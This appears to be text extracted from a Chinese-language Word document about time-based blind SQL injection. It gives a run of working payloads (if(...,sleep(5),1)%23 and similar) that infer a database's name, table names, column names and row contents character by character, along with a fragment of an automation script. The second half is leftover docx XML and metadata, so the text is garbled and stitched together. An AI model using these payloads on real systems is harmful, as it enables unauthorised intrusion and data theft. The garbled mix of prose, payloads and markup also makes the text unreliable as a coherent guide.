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先试数据库的长度，当数字为6时发生了延时，说明数据库名共五个字符。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if(length((SELECT concat(database())))&lt;5,sleep(5),1)%23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if(substr((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),1,1)='A',sleep(5),1)  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开始猜字：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if(substr((SELECT concat(database())),1,1)='m',sleep(5),1)%23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if((substr(database(),%s,1)=’%s’),sleep(10),0) and ”=’&amp;pass=&amp;action=login” %(i,payload)#数据库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查询mydbs数据库中表的数量：3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if((select count(TABLE_NAME) from information_schema.tables where table_schema=0x6d79646273)=3,sleep(5),1)%23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查看表名的长度：3，5，4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if(length((select TABLE_NAME from information_schema.tables where table_schema=0x6d79646273 limit 0,1))=3,sleep(5),1)%23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考验耐心的时候到了，开始爆表名了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if(substr((select TABLE_NAME from information_schema.tables where table_schema=0x6d79646273 limit 0,1),1,1)='l',sleep(5),1)%23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要查询第三个表名的第二个字母是不是l就应该这么写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if(substr((select TABLE_NAME from information_schema.tables where table_schema=0x6d79646273 limit 2,1),2,1)='l',sleep(5),1)%23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接着看motto表中有多少列：3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if((select count(COLUMN_NAME) from information_schema.columns where table_name=0x6D6F74746F )=3,sleep(5),1)%23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测列名长：2,8,5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if(length((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 0,1 ))=2,sleep(2),1)%23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同样的手法开始跑列名，最后得出：id，username，motto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if(substr((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 1,1 ),1,1)='u',sleep(2),1)%23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猜测motto有多少行：4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if((select count(*) from motto)=4,sleep(5),1)%23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最后开始猜字段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if(ASCII(substr((select motto from motto limit 0,1),1,1))=109,sleep(5),1)%23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697F"/>
    <w:rsid w:val="07207927"/>
    <w:rsid w:val="072F6A63"/>
    <w:rsid w:val="07485D93"/>
    <w:rsid w:val="07B22CDA"/>
    <w:rsid w:val="0BD66BC7"/>
    <w:rsid w:val="0E4B521A"/>
    <w:rsid w:val="104A07F5"/>
    <w:rsid w:val="11457C69"/>
    <w:rsid w:val="11906144"/>
    <w:rsid w:val="119F246C"/>
    <w:rsid w:val="12EB3F62"/>
    <w:rsid w:val="1ACD1857"/>
    <w:rsid w:val="1C6B158A"/>
    <w:rsid w:val="1D286E16"/>
    <w:rsid w:val="1F6B4430"/>
    <w:rsid w:val="22255D5A"/>
    <w:rsid w:val="23AD0C83"/>
    <w:rsid w:val="2BE84159"/>
    <w:rsid w:val="2C132734"/>
    <w:rsid w:val="2C8626EC"/>
    <w:rsid w:val="30EF4820"/>
    <w:rsid w:val="313939B7"/>
    <w:rsid w:val="38C81E37"/>
    <w:rsid w:val="3AA10F3C"/>
    <w:rsid w:val="3B7F7C93"/>
    <w:rsid w:val="3C446AA3"/>
    <w:rsid w:val="3DCA6BB2"/>
    <w:rsid w:val="4E361219"/>
    <w:rsid w:val="4E8C7F28"/>
    <w:rsid w:val="4F2E53F1"/>
    <w:rsid w:val="4FFB18CF"/>
    <w:rsid w:val="521D1DB6"/>
    <w:rsid w:val="547A4798"/>
    <w:rsid w:val="54AB6202"/>
    <w:rsid w:val="55B608E8"/>
    <w:rsid w:val="55BA22A3"/>
    <w:rsid w:val="56B06A46"/>
    <w:rsid w:val="5C91180D"/>
    <w:rsid w:val="5DAF25F5"/>
    <w:rsid w:val="615363F6"/>
    <w:rsid w:val="697312E3"/>
    <w:rsid w:val="6AC353B0"/>
    <w:rsid w:val="6CD23A5A"/>
    <w:rsid w:val="6D535020"/>
    <w:rsid w:val="6F000CD3"/>
    <w:rsid w:val="717F697F"/>
    <w:rsid w:val="72E56E6B"/>
    <w:rsid w:val="74706A44"/>
    <w:rsid w:val="7658014B"/>
    <w:rsid w:val="76B961DB"/>
    <w:rsid w:val="7BEF417E"/>
    <w:rsid w:val="7D1F0749"/>
    <w:rsid w:val="7D5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%20and%20m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2018-05-13T08:52:00Z</dcterms:created>
  <dc:creator>you and me</dc:creator>
  <cp:lastModifiedBy>you and me</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-03-12T05:03:38Z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